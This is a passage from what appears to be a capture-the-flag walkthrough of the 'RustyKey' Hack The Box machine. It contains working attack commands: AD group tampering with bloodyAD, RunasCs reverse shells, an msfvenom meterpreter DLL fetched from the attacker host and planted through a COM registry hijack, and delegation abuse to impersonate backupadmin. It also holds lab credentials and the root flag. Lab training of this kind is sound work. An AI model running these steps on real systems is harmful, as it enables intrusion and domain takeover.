+<p>![[Pasted image 20250702204204.png]]</p>
+<p>With the information we now have, I will take another look in Bloodhound. I looked at the shortest path from owned objects. Here you can see that the user is already a member of the support group. The goal is to obtain this user so that we can then modify the registry.</p>
+<p>![[Pasted image 20250702204957.png]]</p>
+<p>First, we will need to remove the support group from the Protected Objects group again. You can see this by looking at the previous Bloodhound photo.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u &#39;IT-Computer3$&#39; -p &#39;Rusty88!&#39; add groupMember HELPDESK &#39;IT-Computer3$&#39;
+[+] IT-Computer3$ added to HELPDESK
+
+┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u &#39;IT-COMPUTER3$&#39; -p &#39;Rusty88!&#39; -k remove groupMember &#39;PROTECTED OBJECTS&#39; &#39;Support&#39;
+[-] Support removed from PROTECTED OBJECTS
+</code></pre><p>Obtaining a TGT ticket.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
+└─$ impacket-getTGT -dc-ip 10.129.17.7 RUSTYKEY.HTB/ee.reed:Hallo@123
+Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in ee.reed.ccache
+</code></pre><p>But as you can see below, I will have to find another way to log in as user ee.reed. I did some research and came across the following page, which uses the runas command. So I will try this by copying the runas.exe tool to the Windows server and executing the command there, setting up a listener from my own machine. <a href="https://arttoolkit.github.io/wadcoms/RunasCs/">https://arttoolkit.github.io/wadcoms/RunasCs/</a></p>
+<p>First, I will need to create the exe file. You can do this by using the command below. You can find this in the file ‘compile_commands.txt’.</p>
+<pre tabindex="0"><code>*Evil-WinRM* PS C:\Users\bb.morgan\Documents&gt; upload /home/kali/HTB/RustyKey/RunasCs/RunasCs.cs
+
+*Evil-WinRM* PS C:\Users\bb.morgan\Documents&gt; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs_net2.exe RunasCs.cs
+</code></pre><p>We will now upload this to our connection with the user bb.morgan, and the listener will start on our Linux machine. You will see that we get the connection as user ee.reed.</p>
+<pre tabindex="0"><code>*Evil-WinRM* PS C:\Users\bb.morgan\Documents&gt; .\RunasCs_net2.exe ee.reed Hallo@123 Powershell.exe -r 10.10.16.49:4444
+[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
+[*] Warning: The logon for user &#39;ee.reed&#39; is limited. Use the flag combination --bypass-uac and --logon-type &#39;8&#39; to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-2ae47e$\Default
+[+] Async process &#39;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#39; with pid 4936 created in background.
+
+┌──(kali㉿kali)-[~/HTB/RustyKey/RunasCs]
+└─$ nc -lvnp 4444                                                     
+listening on [any] 4444 ...
+connect to [10.10.16.49] from (UNKNOWN) [10.129.199.109] 51724
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32&gt; whoami
+whoami
+rustykey\ee.reed
+PS C:\Windows\system32&gt;
+</code></pre><p>By using the following command, you can search the registry for entries related to “zip,” such as related files, programs, or components related to ZIP files. I did this using chatgpt and searching the internet.</p>
+<p>![[Pasted image 20250702223643.png]]</p>
+<pre tabindex="0"><code>PS C:\&gt; reg query HKCR\CLSID /s /f &#34;zip&#34;
+reg query HKCR\CLSID /s /f &#34;zip&#34;
+
+HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}
+    (Default)    REG_SZ    7-Zip Shell Extension
+
+HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
+    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll
+
+HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}
+    (Default)    REG_SZ    Compressed (zipped) Folder SendTo Target
+    FriendlyTypeName    REG_EXPAND_SZ    @%SystemRoot%\system32\zipfldr.dll,-10226
+
+HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\DefaultIcon
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
+
+HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\InProcServer32
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
+
+HKEY_CLASSES_ROOT\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}
+    (Default)    REG_SZ    Compressed (zipped) Folder Context Menu
+
+HKEY_CLASSES_ROOT\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}\InProcServer32
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
+
+HKEY_CLASSES_ROOT\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}
+    (Default)    REG_SZ    Compressed (zipped) Folder Right Drag Handler
+
+HKEY_CLASSES_ROOT\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}\InProcServer32
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
+
+HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\DefaultIcon
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
+
+HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\InProcServer32
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
+
+HKEY_CLASSES_ROOT\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}
+    (Default)    REG_SZ    Compressed (zipped) Folder DropHandler
+
+HKEY_CLASSES_ROOT\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}\InProcServer32
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
+</code></pre><p>Now I am going to create a malicious rce dll file, which I will then place in the location shown above, inside a folder that you create yourself.</p>
+<pre tabindex="0"><code>HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\InProcServer32
+</code></pre><p>We are going to create a malicious file by executing the following command.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.49 LPORT=4444 -f dll -o rce.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of dll file: 9216 bytes
+Saved as: rce.dll
+</code></pre><p>Upload file to Win Connection. Before you can upload the file to the Windows server, you will first need to create the tmp folder. Otherwise, the code will say that the path is incorrect because there is no tmp folder on the C drive. You can create the folder on the C drive by simply executing the following command.</p>
+<pre tabindex="0"><code>PS C:\&gt; mkdir tmp
+</code></pre><pre tabindex="0"><code>Kali machine
+
+──(kali㉿kali)-[~/HTB/RustyKey/RunasCs]
+└─$ python -m http.server 5555               
+Serving HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ...
+10.129.35.77 - - [04/Jul/2025 23:08:23] &#34;GET /test4.dll HTTP/1.1&#34; 200 -
+10.129.35.77 - - [04/Jul/2025 23:08:42] &#34;GET /test4.dll HTTP/1.1&#34; 200 -
+10.129.35.77 - - [04/Jul/2025 23:10:05] &#34;GET /test4.dll HTTP/1.1&#34; 200 -
+
+Win server
+PS C:\tmp&gt; Invoke-WebRequest -Uri &#34;http://10.10.16.49:5555/test4.dll&#34; -OutFile &#34;C:\tmp\test4.dll&#34;
+</code></pre><p>With this command, I add a registry entry under “HKLM\Software\Classes\CLSID{23170F69-40C1-278A-1000-000100020000}\InprocServer32”. I use the reg add command to set the default value of the ‘/ve’ parameter to the path “C:\tmp\rce.dll”, the ‘/d’ parameter, and the ‘/f’ option forces the change without confirmation.</p>
+<pre tabindex="0"><code> PS C:\tmp&gt; reg add &#34;HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32&#34; /ve /d &#34;C:\tmp\rce.dll&#34; /f  
+reg add &#34;HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32&#34; /ve /d &#34;C:\tmp\rce.dll&#34; /f
+The operation completed successfully.
+</code></pre><p>I tried to establish the connection using msfconsole. To connect the server and your Kali machine, you need to enter the same payload in msfconsole that you used in your msfvenom command to create the .dll file. Your next command will then look like this. But as you can see below, the connection is not established.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/RustyKey/RunasCs]
+└─$ msfconsole -q -x &#34;use multi/handler; set payload 
+[*] Using configured payload generic/shell_reverse_tcp
+payload =&gt; windows/x64/shell_reverse_tcp
+lhost =&gt; 10.10.16.49
+lport =&gt; 4444
+[*] Started reverse TCP handler on 10.10.16.49:4444
+</code></pre><p>I started looking for another solution, and after a lot of research, I decided that I could just use the netcat listener command to establish the connection. I then added the file to the registry.
+Now you can see that we have been able to establish a connection with the user mm.turner.</p>
+<pre tabindex="0"><code>nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.49] from (UNKNOWN) [10.129.35.77] 57699
+Microsoft Windows [Version 10.0.17763.7434]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows&gt;whoami
+whoami
+rustykey\mm.turner
+</code></pre><p>Now we can see in Bloodhound what we can do with the user mm.turner. We can see that the user can impersonate dc.rustykey.htb. This means that if I follow the steps in Bloodhound below, the user will obtain backupadmin and thus be able to obtain the root file. For the steps below, I used the following two articles, which I used for troubleshooting.
+<a href="https://www.thehacker.recipes/ad/movement/dacl/">https://www.thehacker.recipes/ad/movement/dacl/</a>
+<a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd">https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd</a></p>
+<p>![[Pasted image 20250704155258.png]]
+To exploit this, I looked it up in the second article above, and below you can see the steps you need to take before we can start user impersonating.</p>
+<p>![[Pasted image 20250704155945.png]]</p>
+<p>First, we will examine the properties of the DC computer.</p>
+<pre tabindex="0"><code>PS C:\Windows&gt; Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount
+Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount
+
+
+DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb
+DNSHostName                          : dc.rustykey.htb
+Enabled                              : True
+Name                                 : DC
+ObjectClass                          : computer
+ObjectGUID                           : dee94947-219e-4b13-9d41-543a4085431c
+PrincipalsAllowedToDelegateToAccount : {}
+SamAccountName                       : DC$
+SID                                  : S-1-5-21-3316070415-896458127-4139322052-1000
+UserPrincipalName                    : 
+</code></pre><p>I have set up <strong>resource-based constrained delegation</strong> on the Active Directory computer object DC. This allows the IT-COMPUTER3$ account to pass authentication tokens to this machine on behalf of other users.</p>
+<pre tabindex="0"><code>PS C:\Windows&gt; Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount &#34;IT-COMPUTER3$&#34;
+Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount &#34;IT-COMPUTER3$&#34;
+</code></pre><p>After setting up the RBCD, I will generate a <strong>Service Ticket (TGS)</strong>, which will allow me to obtain the .ccache file of the user backupadmin. The Domain Controller requests a ticket for the Service Principal Name (<strong>cifs/DC.rustykey.htb</strong>), allowing me to access SMB resources on the Domain Controller with the rights of <strong>backupadmin</strong>. <a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd">https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd</a> &ndash;&gt; (Second Knowledge article from above)</p>
+<pre tabindex="0"><code>getST.py &#39;RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!&#39; -spn &#39;cifs/DC.rustykey.htb&#39; -impersonate backupadmin -dc-ip 10.129.35.77
+Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating backupadmin
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
+</code></pre><p>This specifies which ccache file Kerberos should use for authentication.</p>
+<pre tabindex="0"><code>export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
+</code></pre><p>To connect to the Windows server as user backupadmin, I started using wmiexec.py (WMI = Windows Management Instrumentation). You can use this to execute commands remotely on a Windows machine.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/RustyKey/RunasCs]
+└─$ wmiexec.py -k -no-pass &#39;RUSTYKEY.HTB/backupadmin@dc.rustykey.htb&#39;
+Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\&gt;whoami
+rustykey\backupadmin
+</code></pre><p>Now that we are the backupadmin user, we can retrieve the root flag. Navigate to the user administrator, then go to the desktop folder, where you will see the root.txt file.</p>
+<p>Root flag: 7607f02fc0e4e723139a93f14e27dbf9</p>
+<pre tabindex="0"><code>C:\Users\Administrator\Desktop&gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is 00BA-0DBE
+
+ Directory of C:\Users\Administrator\Desktop
+
+06/24/2025  10:00 AM    &lt;DIR&gt;          .
+06/24/2025  10:00 AM    &lt;DIR&gt;          ..
+07/04/2025  12:45 PM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   2,950,602,752 bytes free
+
+C:\Users\Administrator\Desktop&gt;type root.txt
+7607f02fc0e4e723139a93f14e27dbf9
+</code></pre><p>![[Pasted image 20250704172232.png]]</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
